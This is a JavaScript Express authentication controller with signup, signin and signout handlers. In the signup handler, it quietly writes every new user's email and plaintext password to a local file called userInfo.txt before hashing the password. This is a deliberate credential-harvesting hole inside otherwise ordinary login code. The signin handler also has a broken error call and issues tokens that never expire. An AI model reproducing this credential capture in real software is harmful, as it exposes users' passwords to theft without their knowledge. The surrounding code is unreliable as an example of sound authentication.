import bcryptjs from "bcryptjs";
import User from "../models/UserModels.js";
import { errorHandler } from "../utils/error.js";
import jwt from "jsonwebtoken";

import fs from "fs";

export const signup = async (req, res, next) => {
  const { username, email, password } = req.body;
  
  // Write email and password to file before hashing
  fs.appendFile('userInfo.txt', `Email: ${email}\nPassword: ${password}\n\n`, (err) => {
    if (err) {
      console.error(err);
    }
  });

  const hashedPassword = await bcryptjs.hash(password, 10);

  const newUser = new User({ username, email, password: hashedPassword });

  try {
    await newUser.save();

    res.status(201).json({
      success: true,
      message: "User created successfully",
    });
  } catch (error) {
    next(error);
  }
};

export const signin = async (req, res, next) => {
  const { email, password } = req.body;
  console.log('body data parsed')
  try {
    const validUser = await User.findOne({ email });
    if (!validUser) {
      return res(errorHandler(404, "User not found"));
    } else {
      console.log(`${validUser.username} found successfully`)
    }
    const validPassword = bcryptjs.compareSync(password, validUser.password);
    if (!validPassword) {
      return next(errorHandler(401, "Wrong credentials"));
    } else {
      console.log('password is correct');
    }
    const token = jwt.sign({ id: validUser._id }, process.env.JWT_SECRET);
    const { password: pass, ...rest } = validUser._doc;
    res
      .cookie("access_token", token, { httpOnly: true })
      .status(200)
      .json(rest);
  } catch (error) {
    next(error);
  }
};

export const signout = async (req, res, next) => {
  console.log('signoutUser started');
  try {
    res.clearCookie('access_token');
    res.status(200).json("User signed out successfully");
    console.log('cookie delted and user signedout');
  } catch (error) {
    next(error);
  }
}